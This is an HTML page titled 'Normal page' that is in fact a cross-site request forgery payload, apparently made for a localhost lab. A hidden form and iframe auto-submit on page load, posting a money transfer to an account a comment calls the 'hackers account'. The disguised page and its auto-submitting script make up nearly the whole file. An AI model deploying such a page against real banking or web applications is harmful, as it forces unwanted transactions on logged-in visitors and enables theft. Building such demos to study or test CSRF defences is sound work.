<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Normal page</title>
    </head>
    <body>
        <h1>This page is normal</h1>

        <iframe style="display:none" name="csrf-frame"></iframe>
        <form method='POST' style="display:none" action='http://localhost/csrf/index.php' target="csrf-frame" id="csrf-form">
            <input name="account" value="2345534534534535">

            <input name="toAccount" value="00-210312313-125"><!-- hackers account -->

            <input name="amount" value="$43534534535345345">

          <input type='submit' value='submit'>
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
